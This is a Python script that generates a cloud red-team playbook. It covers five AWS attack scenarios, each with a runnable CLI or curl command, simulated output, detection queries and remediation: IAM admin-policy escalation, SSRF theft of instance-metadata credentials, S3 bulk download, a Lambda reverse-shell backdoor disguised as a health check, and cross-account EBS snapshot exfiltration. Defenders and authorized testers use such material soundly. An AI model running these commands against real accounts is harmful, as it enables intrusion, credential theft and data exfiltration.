#!/usr/bin/env python3
"""Cloud Red Team Playbook Generator

Simulates cloud exploitation scenarios across AWS/GCP/Azure and generates
a professional playbook report with attack steps, simulated output, and
detection rules for defensive counterparts.

Usage:
    python cloud_red_team_playbook.py [--output report.md] [--format md|json]

Author: Security Research Team
Version: 1.0.0
"""

import json
import argparse
import textwrap
import random
import hashlib
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import List, Optional
from enum import Enum


# ─── Data Models ──────────────────────────────────────────────────────────────

class CloudProvider(str, Enum):
    AWS = "AWS"
    GCP = "GCP"
    AZURE = "Azure"


class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"


class MITREATTCK(str, Enum):
    RECONNAISSANCE = "TA0043"
    INITIAL_ACCESS = "TA0001"
    PRIVILEGE_ESCALATION = "TA0004"
    CREDENTIAL_ACCESS = "TA0006"
    LATERAL_MOVEMENT = "TA0008"
    EXFILTRATION = "TA0010"
    IMPACT = "TA0040"


@dataclass
class DetectionRule:
    """Defensive detection rule for an attack step."""
    rule_id: str
    title: str
    description: str
    data_source: str
    query: str
    false_positives: List[str]
    severity: Severity


@dataclass
class AttackStep:
    """A single step in an attack scenario."""
    step_number: int
    name: str
    description: str
    command: str
    expected_output: str
    detection_rules: List[DetectionRule] = field(default_factory=list)


@dataclass
class AttackScenario:
    """A complete cloud attack scenario."""
    scenario_id: str
    title: str
    provider: CloudProvider
    severity: Severity
    mitre_technique: str
    mitre_id: MITREATTCK
    description: str
    prerequisites: List[str]
    steps: List[AttackStep]
    remediation: List[str]
    references: List[str]


# ─── Simulation Engine ────────────────────────────────────────────────────────

class CloudSimulator:
    """Generates realistic simulated output for cloud attack steps."""

    def __init__(self, seed: int = 42):
        self.rng = random.Random(seed)
        self._session_id = hashlib.sha256(
            datetime.now().isoformat().encode()
        ).hexdigest()[:12]

    def _arn(self, service: str, resource: str, region: str = "us-east-1") -> str:
        account = f"{self.rng.randint(100000000000, 999999999999)}"
        return f"arn:aws:{service}:{region}:{account}:{resource}"

    def _timestamp(self) -> str:
        base = datetime(2026, 9, 5, 14, 30, 0)
        offset = timedelta(seconds=self.rng.randint(0, 3600))
        return (base + offset).strftime("%Y-%m-%dT%H:%M:%SZ")

    def simulate_iam_enum(self) -> str:
        roles = [
            ("AdminAccessRole", "AdministratorAccess"),
            ("DevOpsRole", "PowerUserAccess + iam:CreatePolicy"),
            ("ReadOnlyRole", "ReadOnlyAccess"),
            ("LambdaExecutionRole", "AWSLambdaBasicExecution + s3:GetObject"),
        ]
        lines = [f"[{self._session_id}] IAM Role Enumeration Complete", "=" * 55]
        for role, policy in roles:
            arn = self._arn("iam", f"role/{role}")
            lines.append(f"  Role: {role}")
            lines.append(f"  ARN:  {arn}")
            lines.append(f"  Policies: {policy}")
            lines.append(f"  Created: {self._timestamp()}")
            lines.append("")
        lines.append(f"[+] Found {len(roles)} roles. Escalation path identified.")
        return "\n".join(lines)

    def simulate_metadata_ssrf(self) -> str:
        creds = {
            "AccessKeyId": f"ASIA{''.join([self.rng.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16)])}",
            "SecretAccessKey": hashlib.sha256(b"simulated").hexdigest()[:30],
            "Token": hashlib.sha512(b"session_token").hexdigest()[:100],
            "Expiration": "2026-09-05T20:30:00Z",
        }
        lines = [
            f"[SSRF] Target: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            f"[SSRF] Status: 200 OK",
            f"[SSRF] Retrieved temporary credentials:",
        ]
        for k, v in creds.items():
            lines.append(f"  {k}: {v}")
        lines.append(f"\n[+] Credentials exfiltrated via IMDSv1 (no session token required)")
        return "\n".join(lines)

    def simulate_s3_exposure(self) -> str:
        buckets = [
            ("company-backups-prod", "Public", "12.4 GB", "2024-01-15"),
            ("customer-data-archive", "Public", "89.2 GB", "2023-11-03"),
            ("terraform-state-prod", "Authenticated AWS Users", "2.1 MB", "2026-08-20"),
            ("app-logs-debug", "Private (misconfigured ACL)", "450 MB", "2026-09-01"),
        ]
        lines = [
            f"[{self._session_id}] S3 Bucket Enumeration",
            "=" * 55,
        ]
        for name, access, size, created in buckets:
            lines.append(f"  Bucket: s3://{name}")
            lines.append(f"  Access: {access}")
            lines.append(f"  Size:   {size}")
            lines.append(f"  Created: {created}")
            lines.append("")
        critical = sum(1 for b in buckets if "Public" in b[1])
        lines.append(f"[!] {critical}/{len(buckets)} buckets have public access")
        return "\n".join(lines)

    def simulate_lambda_backdoor(self) -> str:
        return textwrap.dedent(f"""\
        [Lambda] Backdoor Deployment Simulation
        ==========================================
        Function Name:  health-check-monitor
        Runtime:        python3.12
        Handler:        lambda_function.handler
        Role:           {self._arn("iam", "role/LambdaExecutionRole")}
        Region:         us-east-1
        Status:         Active (LAST MODIFIED: {self._timestamp()})

        [PAYLOAD] Reverse shell callback → 198.51.100.{self.rng.randint(1,254)}:4444
        [PERSISTENCE] CloudWatch Events trigger every 5 minutes
        [EXFIL] Staging bucket: s3://lambda-temp-{self.rng.randint(1000,9999)}/

        [+] Backdoor active. Callback received at {self._timestamp()}
        [+] Persistence via scheduled event rule.
        """).strip()

    def simulate_privilege_escalation(self) -> str:
        return textwrap.dedent(f"""\
        [IAM] Privilege Escalation via Policy Attachment
        ================================================
        [STEP 1] Attached AdministratorAccess to dev-user
          └─ aws iam attach-user-policy \\
              --user-name dev-user \\
              --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
          └─ Status: 200 OK

        [STEP 2] Verified elevated privileges
          └─ aws sts get-caller-identity
          └─ {{"UserId": "AIDA{''.join([self.rng.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16)])}",
               "Account": "{self.rng.randint(100000000000, 999999999999)}",
               "Arn": "arn:aws:iam::{self.rng.randint(100000000000, 999999999999)}:user/dev-user"}}

        [+] Escalation complete. Full admin access achieved.
        [+] Lateral movement possible to {self.rng.randint(2,15)} other accounts via cross-account roles.
        """).strip()

    def simulate_snapshot_exfil(self) -> str:
        return textwrap.dedent(f"""\
        [EC2] EBS Snapshot Exfiltration
        ================================
        [STEP 1] Identified sensitive volumes
          └─ vol-{self.rng.randint(10000000,99999999)} (prod-db, 500GB, encrypted: True)
          └─ vol-{self.rng.randint(10000000,99999999)} (dev-app, 100GB, encrypted: False)

        [STEP 2] Created snapshots
          └─ snap-{self.rng.randint(10000000,99999999)} (vol-{self.rng.randint(10000000,99999999)})
          └─ snap-{self.rng.randint(10000000,99999999)} (vol-{self.rng.randint(10000000,99999999)})

        [STEP 3] Modified snapshot permissions (shared with external account)
          └─ aws ec2 modify-snapshot-attribute \\
              --snapshot-id snap-{self.rng.randint(10000000,99999999)} \\
              --attribute createVolumePermission \\
              --user-ids {self.rng.randint(100000000000, 999999999999)}

        [!] Snapshot shared externally. Data exfiltration possible.
        [+] Attack path: snapshot → external account → volume creation → mount
        """).strip()


# ─── Playbook Builder ─────────────────────────────────────────────────────────

def build_scenarios() -> List[AttackScenario]:
    """Construct all cloud attack scenarios."""
    sim = CloudSimulator()

    scenarios = [
        AttackScenario(
            scenario_id="AWS-001",
            title="IAM Privilege Escalation via Policy Manipulation",
            provider=CloudProvider.AWS,
            severity=Severity.CRITICAL,
            mitre_technique="Valid Accounts: Cloud Accounts",
            mitre_id=MITREATTCK.PRIVILEGE_ESCALATION,
            description=(
                "An attacker with limited IAM permissions escalates to full admin access "
                "by attaching privileged policies to their own user or creating new users "
                "with elevated permissions. Common when iam:AttachUserPolicy or "
                "iam:CreatePolicy is granted to low-privilege identities."
            ),
            prerequisites=[
                "Valid AWS credentials with IAM write permissions",
                "Access to AWS CLI or API",
                "Target account ID known or discoverable",
            ],
            steps=[
                AttackStep(
                    step_number=1,
                    name="Enumerate IAM permissions",
                    description="Identify what IAM actions the current identity can perform.",
                    command="aws iam list-attached-user-policies --user-name $USER && aws iam simulate-principal-policy --policy-source-arn $ARN --action-names iam:AttachUserPolicy iam:CreatePolicy iam:PutRolePolicy",
                    expected_output=sim.simulate_iam_enum(),
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-001a",
                            title="IAM Policy Enumeration Detection",
                            description="Detects unusual IAM enumeration activity from a single identity within a short window.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, userIdentity.arn, eventName, sourceIPAddress
| filter eventName in ('ListAttachedUserPolicies', 'ListPolicies', 'SimulatePrincipalPolicy')
| stats count(*) as enum_count by userIdentity.arn, bin(5m)
| filter enum_count > 10""",
                            false_positives=["Automated compliance scanning tools", "New security tool onboarding"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=2,
                    name="Attach admin policy to current user",
                    description="Attach AdministratorAccess to escalate privileges.",
                    command='aws iam attach-user-policy --user-name $USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
                    expected_output=sim.simulate_privilege_escalation(),
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-001b",
                            title="Admin Policy Attachment Alert",
                            description="Alerts when a non-admin identity attaches privileged policies.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, userIdentity.arn, requestParameters.policyArn
| filter eventName = 'AttachUserPolicy'
  and requestParameters.policyArn like 'AdministratorAccess'
| filter userIdentity.arn not like 'security-automation-role'""",
                            false_positives=["Break-glass emergency access procedures"],
                            severity=Severity.CRITICAL,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=3,
                    name="Verify elevated access",
                    description="Confirm AdministratorAccess was successfully applied.",
                    command="aws sts get-caller-identity && aws iam list-users --max-items 5",
                    expected_output='{"UserId": "AIDA...", "Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/dev-user"}',
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-001c",
                            title="Privilege Verification After Escalation",
                            description="Detects post-escalation enumeration activity.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, userIdentity.arn, eventName
| filter eventName in ('GetCallerIdentity', 'ListUsers', 'ListRoles')
| filter @timestamp > (escalation_time)
| stats count(*) by userIdentity.arn, bin(1m)""",
                            false_positives=[],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
            ],
            remediation=[
                "Remove the attached AdministratorAccess policy immediately",
                "Rotate credentials for the compromised identity",
                "Audit all actions performed by the identity during the escalation window",
                "Implement SCPs to prevent iam:* actions outside break-glass roles",
                "Enable AWS Organizations SCPs with deny for iam:AttachUserPolicy",
            ],
            references=[
                "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
                "https://attack.mitre.org/techniques/T1078/004/",
            ],
        ),
        AttackScenario(
            scenario_id="AWS-002",
            title="Metadata Service SSRF Credential Theft",
            provider=CloudProvider.AWS,
            severity=Severity.CRITICAL,
            mitre_technique="Steal Application Access Token",
            mitre_id=MITREATTCK.CREDENTIAL_ACCESS,
            description=(
                "Exploits SSRF vulnerability in a web application running on EC2 to retrieve "
                "temporary IAM credentials from the EC2 Instance Metadata Service (IMDS). "
                "IMDSv1 allows unauthenticated access, while IMDSv2 requires a session token."
            ),
            prerequisites=[
                "SSRF vulnerability in an application hosted on EC2",
                "Target EC2 instance has an IAM role attached",
                "IMDSv1 enabled (default) or session token bypassable",
            ],
            steps=[
                AttackStep(
                    step_number=1,
                    name="Confirm SSRF vulnerability",
                    description="Verify the application is vulnerable to SSRF by requesting internal metadata endpoint.",
                    command='curl -s "https://target.app/api/fetch?url=http://169.254.169.254/latest/meta-data/"',
                    expected_output="ami-id\nami-launch-index\niam/\nhostname\n...",
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-002a",
                            title="SSRF to Metadata Service Detection",
                            description="Detects web requests targeting the IMDS IP address.",
                            data_source="VPC Flow Logs + Application Logs",
                            query="""fields @timestamp, srcAddr, dstAddr, dstPort
| filter dstAddr = '169.254.169.254'
| filter dstPort in (80, 8080, 443)
| stats count(*) by srcAddr, bin(5m)""",
                            false_positives=["Health check systems using metadata for instance identification"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=2,
                    name="Enumerate IAM role name",
                    description="Get the IAM role name associated with the instance.",
                    command='curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
                    expected_output="EC2-WebApp-Role",
                    detection_rules=[],
                ),
                AttackStep(
                    step_number=3,
                    name="Exfiltrate temporary credentials",
                    description="Retrieve the IAM role's temporary access keys, secret key, and session token.",
                    command='curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebApp-Role"',
                    expected_output=sim.simulate_metadata_ssrf(),
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-002b",
                            title="IMDS Credential Access from Web App",
                            description="Detects credential retrieval via IMDS from a non-instance identity.",
                            data_source="AWS CloudTrail + VPC Flow Logs",
                            query="""fields @timestamp, userIdentity.arn, sourceIPAddress, userAgent
| filter eventName in ('AssumeRole', 'GetSessionToken')
| filter sourceIPAddress != instance_ip
| filter userAgent like 'curl' or userAgent like 'python-requests'""",
                            false_positives=["Legitimate SDK usage from containerized workloads"],
                            severity=Severity.CRITICAL,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=4,
                    name="Configure stolen credentials",
                    description="Configure AWS CLI with stolen credentials for persistent access.",
                    command="aws configure set aws_access_key_id ASIA...\naws configure set aws_secret_access_key ...\naws configure set aws_session_token ...",
                    expected_output="Credentials configured. Testing access...\naws sts get-caller-identity → arn:aws:iam::123456789012:assumed-role/EC2-WebApp-Role/i-0abc123",
                    detection_rules=[],
                ),
            ],
            remediation=[
                "Patch the SSRF vulnerability in the application",
                "Enforce IMDSv2 with hop limit of 1 on all EC2 instances",
                "Apply least-privilege IAM roles to EC2 instances",
                "Rotate the compromised IAM role",
                "Use aws:SourceIp condition keys to restrict role usage to known IPs",
                "Deploy SSM Session Manager to eliminate need for instance credentials",
            ],
            references=[
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
                "https://attack.mitre.org/techniques/T1552/005/",
            ],
        ),
        AttackScenario(
            scenario_id="AWS-003",
            title="S3 Bucket Data Exposure & Exfiltration",
            provider=CloudProvider.AWS,
            severity=Severity.HIGH,
            mitre_technique="Unsecured Credentials / Data from Cloud Storage",
            mitre_id=MITREATTCK.EXFILTRATION,
            description=(
                "Identifies publicly accessible or misconfigured S3 buckets containing sensitive "
                "data. Attackers enumerate buckets, check ACLs and bucket policies, then download "
                "exposed data. Common when Block Public Access is disabled or ACLs are misconfigured."
            ),
            prerequisites=[
                "AWS credentials with s3:ListAllMyBuckets or public bucket enumeration",
                "Knowledge of common bucket naming patterns",
                "Tools: awscli, s3scanner, or custom scripts",
            ],
            steps=[
                AttackStep(
                    step_number=1,
                    name="List all S3 buckets",
                    description="Enumerate all S3 buckets in the account.",
                    command="aws s3api list-buckets --query 'Buckets[*].Name' --output text",
                    expected_output="company-backups-prod\ncustomer-data-archive\nterraform-state-prod\napp-logs-debug",
                    detection_rules=[],
                ),
                AttackStep(
                    step_number=2,
                    name="Check bucket ACLs and policies",
                    description="Identify buckets with public or cross-account access.",
                    command=r'for b in $(aws s3api list-buckets --query "Buckets[].Name" --output text); do echo "=== $b ==="; aws s3api get-bucket-acl --bucket $b 2>&1 | grep -i "allusers\|authenticatedusers"; done',
                    expected_output=sim.simulate_s3_exposure(),
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-003a",
                            title="S3 Public Access Configuration Change",
                            description="Detects changes that grant public access to S3 buckets.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, requestParameters.bucketName, requestParameters.AccessControlPolicy
| filter eventName in ('PutBucketAcl', 'PutBucketPolicy')
  and (requestParameters.AccessControlPolicy.Grants.Grantee.URI like 'AllUsers'
    or requestParameters.AccessControlPolicy.Grants.Grantee.URI like 'AuthenticatedUsers'
    or requestParameters.bucketPolicy.Statement.Principal = '*')""",
                            false_positives=["Intentional static website hosting buckets"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=3,
                    name="Download exposed data",
                    description="Download files from publicly accessible buckets.",
                    command="aws s3 sync s3://customer-data-archive ./exfil/ --no-sign-request",
                    expected_output="[SIM] Downloaded 89.2 GB across 14,382 objects to ./exfil/",
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-003b",
                            title="Mass S3 Object Download from External IP",
                            description="Detects bulk S3 downloads from non-corporate IP ranges.",
                            data_source="AWS CloudTrail + S3 Server Access Logs",
                            query="""fields @timestamp, sourceIPAddress, requestParameters.bucketName, key
| filter eventName = 'GetObject'
| filter sourceIPAddress not in (corporate_ip_ranges)
| stats count(*) as downloads by sourceIPAddress, bin(1h)
| filter downloads > 100""",
                            false_positives=["CDN cache warming", "Legitimate partner data sync"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
            ],
            remediation=[
                "Enable S3 Block Public Access at the account level",
                "Remove public ACLs and overly permissive bucket policies",
                "Enable S3 access logging and CloudTrail data events",
                "Apply encryption at rest to all S3 buckets",
                "Use S3 Access Points with network origin restrictions",
                "Implement S3 Inventory to track sensitive data locations",
            ],
            references=[
                "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html",
                "https://attack.mitre.org/techniques/T1530/",
            ],
        ),
        AttackScenario(
            scenario_id="AWS-004",
            title="Lambda Function Backdoor & Persistence",
            provider=CloudProvider.AWS,
            severity=Severity.HIGH,
            mitre_technique="Serverless Execution / Event Triggered Execution",
            mitre_id=MITREATTCK.LATERAL_MOVEMENT,
            description=(
                "Deploys a backdoored Lambda function that establishes persistence in the cloud "
                "environment. The function is triggered on a schedule, executes a reverse shell or "
                "data exfiltration routine, and maintains access even if the original entry point "
                "is remediated. Lambda functions are often overlooked in incident response."
            ),
            prerequisites=[
                "AWS credentials with lambda:CreateFunction and iam:PassRole",
                "Ability to create CloudWatch Events/EventBridge rules",
                "Existing Lambda execution role to attach",
            ],
            steps=[
                AttackStep(
                    step_number=1,
                    name="Identify exploitable Lambda role",
                    description="Find Lambda execution roles with permissions that can be abused.",
                    command='aws iam list-roles --query "Roles[?RoleName!=null && (RoleName contains `Lambda` || RoleName contains `lambda`)].RoleName"',
                    expected_output='["LambdaExecutionRole", "health-check-role", "data-processor-role"]',
                    detection_rules=[],
                ),
                AttackStep(
                    step_number=2,
                    name="Deploy backdoored Lambda function",
                    description="Create a Lambda function with a reverse shell payload disguised as a health check.",
                    command='aws lambda create-function --function-name health-check-monitor --runtime python3.12 --handler lambda_function.handler --role arn:aws:iam::123456789012:role/LambdaExecutionRole --zip-file fileb://backdoor.zip',
                    expected_output=sim.simulate_lambda_backdoor(),
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-004a",
                            title="Suspicious Lambda Function Creation",
                            description="Detects Lambda functions created with unusual names or from external IPs.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, userIdentity.arn, requestParameters.functionName, sourceIPAddress
| filter eventName = 'CreateFunction'
| filter sourceIPAddress not in (corporate_ip_ranges)
| filter requestParameters.functionName not like /-prod$/ 
  and requestParameters.functionName not like /-staging$/
  and requestParameters.functionName not like /-dev$/""",
                            false_positives=["New application deployments", "Developer testing"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=3,
                    name="Establish persistence via scheduled trigger",
                    description="Create a CloudWatch Events rule to invoke the function every 5 minutes.",
                    command='aws events put-rule --name health-check-schedule --schedule-expression "rate(5 minutes)" --state ENABLED && aws events put-targets --rule health-check-schedule --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:health-check-monitor"',
                    expected_output='{"FailedEntryCount": 0}',
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-004b",
                            title="Lambda Persistence via EventBridge Rule",
                            description="Detects EventBridge rules targeting newly created Lambda functions.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, requestParameters.rule, targets.Arn
| filter eventName in ('PutRule', 'PutTargets')
| filter targets.Arn like 'lambda'
| filter @timestamp > (lambda_create_time - 300)""",
                            false_positives=["Legitimate serverless application architecture"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=4,
                    name="Confirm callback and persistence",
                    description="Verify the backdoor is receiving callbacks and the persistence is active.",
                    command="aws logs filter-log-events --log-group-name /aws/lambda/health-check-monitor --filter-pattern 'callback'",
                    expected_output="[SIM] Callback received from 10.0.1.50 at 2026-09-05T14:35:22Z - shell active",
                    detection_rules=[],
                ),
            ],
            remediation=[
                "Delete the backdoored Lambda function and associated EventBridge rules",
                "Review all Lambda functions created in the last 30 days",
                "Audit IAM roles for excessive lambda:CreateFunction permissions",
                "Enable Lambda code signing to prevent unauthorized deployments",
                "Implement AWS Config rules for Lambda function compliance",
                "Monitor Lambda invocations from unexpected source IPs",
            ],
            references=[
                "https://www.splunk.com/en_us/blog/security/cloud-security-serverless-threats.html",
                "https://attack.mitre.org/techniques/T1059/006/",
            ],
        ),
        AttackScenario(
            scenario_id="AWS-005",
            title="EBS Snapshot Exfiltration via Cross-Account Sharing",
            provider=CloudProvider.AWS,
            severity=Severity.CRITICAL,
            mitre_technique="Data from Cloud Storage / Transfer Data to Cloud Account",
            mitre_id=MITREATTCK.EXFILTRATION,
            description=(
                "Creates EBS snapshots of sensitive volumes and shares them with an attacker-controlled "
                "AWS account. The attacker then creates volumes from these snapshots in their own "
                "account, bypassing network-level controls and many monitoring solutions."
            ),
            prerequisites=[
                "AWS credentials with ec2:CreateSnapshot and ec2:ModifySnapshotAttribute",
                "Knowledge of volume IDs containing sensitive data",
                "An attacker-controlled AWS account",
            ],
            steps=[
                AttackStep(
                    step_number=1,
                    name="Identify sensitive volumes",
                    description="List EBS volumes and identify those attached to production instances.",
                    command='aws ec2 describe-volumes --filters Name=tag:Environment,Values=production --query "Volumes[*].{ID:VolumeId,Size:Size,Encrypted:Encrypted,Instance:Attachments[0].InstanceId}"',
                    expected_output='[{"ID": "vol-0abc123", "Size": 500, "Encrypted": true, "Instance": "i-0prod123"}]',
                    detection_rules=[],
                ),
                AttackStep(
                    step_number=2,
                    name="Create EBS snapshots",
                    description="Create snapshots of the identified sensitive volumes.",
                    command="aws ec2 create-snapshot --volume-id vol-0abc123 --description 'Automated backup' --tag-specifications 'ResourceType=snapshot,Tags=[{Key=Name,Value=temp-backup}]'",
                    expected_output=sim.simulate_snapshot_exfil(),
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-005a",
                            title="EBS Snapshot Creation Alert",
                            description="Detects snapshot creation for production volumes outside backup windows.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, requestParameters.volumeId, userIdentity.arn, sourceIPAddress
| filter eventName = 'CreateSnapshot'
| filter requestParameters.volumeId in (production_volume_ids)
| filter @timestamp not between (backup_window_start, backup_window_end)""",
                            false_positives=["Emergency backups during incident response", "Disaster recovery testing"],
                            severity=Severity.HIGH,
                        ),
                    ],
                ),
                AttackStep(
                    step_number=3,
                    name="Share snapshot with external account",
                    description="Modify snapshot attributes to grant create volume permission to attacker account.",
                    command="aws ec2 modify-snapshot-attribute --snapshot-id snap-0xyz789 --attribute createVolumePermission --user-ids 999888777666",
                    expected_output='{"Return": true}',
                    detection_rules=[
                        DetectionRule(
                            rule_id="DET-AWS-005b",
                            title="EBS Snapshot Shared with External Account",
                            description="Detects snapshot permission modifications that share with external accounts.",
                            data_source="AWS CloudTrail",
                            query="""fields @timestamp, requestParameters.snapshotId, requestParameters.userIds
| filter eventName = 'ModifySnapshotAttribute'
| filter requestParameters.createVolumePermission exists
| filter requestParameters.userIds not in (trusted_account_ids)""",
                            false_positives=["Cross-account DR in multi-account architecture"],
                            severity=Severity.CRITICAL,
                        ),
                    ],
                ),
            ],
            remediation=[
                "Revoke the external account's snapshot access immediately",
                "Delete the compromised snapshots",
                "Implement SCPs denying ec2:ModifySnapshotAttribute for cross-account sharing",
                "Enable EBS encryption with customer-managed KMS keys (CMK)",
                "Restrict KMS key policies to prevent external account key access",
                "Audit all shared snapshots across accounts using AWS Config",
            ],
            references=[
                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html",
                "https://attack.mitre.org/techniques/T1537/",
            ],
        ),
    ]

    return scenarios


# ─── Report Generators ────────────────────────────────────────────────────────

def generate_markdown_report(scenarios: List[AttackScenario]) -> str:
    """Generate a professional Markdown playbook report."""
    lines = []
    lines.append("# Cloud Red Team Playbook")
    lines.append(f"\n> Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S EDT')}")
    lines.append(f"> Scenarios: {len(scenarios)}")
    lines.append(f"> Providers: AWS")
    lines.append(f"> Classification: INTERNAL — For authorized security testing only\n")

    # Table of Contents
    lines.append("## Table of Contents\n")
    for s in scenarios:
        lines.append(f"- [{s.scenario_id}](#{s.scenario_id.lower()}) {s.title} [{s.severity.value}]")
    lines.append("")

    # Executive Summary
    lines.append("## Executive Summary\n")
    lines.append("This playbook documents cloud attack scenarios targeting AWS infrastructure, ")
    lines.append("covering the complete kill chain from initial access through exfiltration. ")
    lines.append("Each scenario includes:")
    lines.append("- Attack simulation with realistic output")
    lines.append("- Step-by-step commands for red team execution")
    lines.append("- Detection rules for blue team defense")
    lines.append("- Remediation guidance\n")

    severity_counts = {}
    for s in scenarios:
        severity_counts[s.severity.value] = severity_counts.get(s.severity.value, 0) + 1
    lines.append("### Severity Distribution\n")
    lines.append("| Severity | Count |")
    lines.append("|----------|-------|")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if sev in severity_counts:
            lines.append(f"| {sev} | {severity_counts[sev]} |")
    lines.append("")

    # Scenarios
    for s in scenarios:
        lines.append(f"---\n")
        lines.append(f"## {s.scenario_id}: {s.title}\n")
        lines.append(f"| Field | Value |")
        lines.append(f"|-------|-------|")
        lines.append(f"| **Provider** | {s.provider.value} |")
        lines.append(f"| **Severity** | {s.severity.value} |")
        lines.append(f"| **MITRE ATT&CK** | {s.mitre_id.value} — {s.mitre_technique} |")
        lines.append(f"| **Scenario ID** | {s.scenario_id} |\n")

        lines.append(f"### Description\n")
        lines.append(f"{s.description}\n")

        lines.append("### Prerequisites\n")
        for p in s.prerequisites:
            lines.append(f"- {p}")
        lines.append("")

        lines.append("### Attack Chain\n")
        for step in s.steps:
            lines.append(f"#### Step {step.step_number}: {step.name}\n")
            lines.append(f"**Description:** {step.description}\n")
            lines.append(f"**Command:**\n```bash\n{step.command}\n```\n")
            lines.append(f"**Simulated Output:**\n```\n{step.expected_output}\n```\n")

            if step.detection_rules:
                lines.append("**Detection Rules:**\n")
                for rule in step.detection_rules:
                    lines.append(f"> **{rule.rule_id}** — {rule.title} [{rule.severity.value}]")
                    lines.append(f"> - *Data Source:* {rule.data_source}")
                    lines.append(f"> - *Query:*\n> ```sql\n> {rule.query.strip()}\n> ```")
                    if rule.false_positives:
                        lines.append(f"> - *False Positives:* {', '.join(rule.false_positives)}")
                    lines.append("")

        lines.append("### Remediation\n")
        for i, r in enumerate(s.remediation, 1):
            lines.append(f"{i}. {r}")
        lines.append("")

        lines.append("### References\n")
        for ref in s.references:
            lines.append(f"- {ref}")
        lines.append("")

    # Detection Summary
    lines.append("---\n")
    lines.append("## Detection Rules Summary\n")
    lines.append("| Rule ID | Title | Severity | Data Source |")
    lines.append("|---------|-------|----------|-------------|")
    for s in scenarios:
        for step in s.steps:
            for rule in step.detection_rules:
                lines.append(f"| {rule.rule_id} | {rule.title} | {rule.severity.value} | {rule.data_source} |")
    lines.append("")

    # Appendix
    lines.append("---\n")
    lines.append("## Appendix: MITRE ATT&CK Mapping\n")
    lines.append("| Scenario | Technique | Tactic |")
    lines.append("|----------|-----------|--------|")
    for s in scenarios:
        lines.append(f"| {s.scenario_id} | {s.mitre_technique} | {s.mitre_id.value} |")
    lines.append("")

    lines.append("---\n")
    lines.append("*This playbook is for authorized security testing and educational purposes only.*\n")

    return "\n".join(lines)


def generate_json_report(scenarios: List[AttackScenario]) -> str:
    """Generate a JSON playbook report."""
    data = {
        "metadata": {
            "title": "Cloud Red Team Playbook",
            "generated": datetime.now().isoformat(),
            "version": "1.0.0",
            "scenario_count": len(scenarios),
        },
        "scenarios": [],
    }
    for s in scenarios:
        scenario_dict = {
            "id": s.scenario_id,
            "title": s.title,
            "provider": s.provider.value,
            "severity": s.severity.value,
            "mitre": {"id": s.mitre_id.value, "technique": s.mitre_technique},
            "description": s.description,
            "prerequisites": s.prerequisites,
            "steps": [],
            "remediation": s.remediation,
            "references": s.references,
        }
        for step in s.steps:
            step_dict = {
                "number": step.step_number,
                "name": step.name,
                "description": step.description,
                "command": step.command,
                "expected_output": step.expected_output,
                "detection_rules": [
                    {
                        "id": r.rule_id,
                        "title": r.title,
                        "description": r.description,
                        "data_source": r.data_source,
                        "query": r.query,
                        "false_positives": r.false_positives,
                        "severity": r.severity.value,
                    }
                    for r in step.detection_rules
                ],
            }
            scenario_dict["steps"].append(step_dict)
        data["scenarios"].append(scenario_dict)

    return json.dumps(data, indent=2)


# ─── Main Entry Point ─────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Cloud Red Team Playbook Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python cloud_red_team_playbook.py
              python cloud_red_team_playbook.py --output playbook.md
              python cloud_red_team_playbook.py --format json --output playbook.json
        """),
    )
    parser.add_argument(
        "--output", "-o",
        default=None,
        help="Output file path (default: print to stdout)",
    )
    parser.add_argument(
        "--format", "-f",
        choices=["md", "json"],
        default="md",
        help="Output format: md (Markdown) or json (default: md)",
    )
    args = parser.parse_args()

    scenarios = build_scenarios()

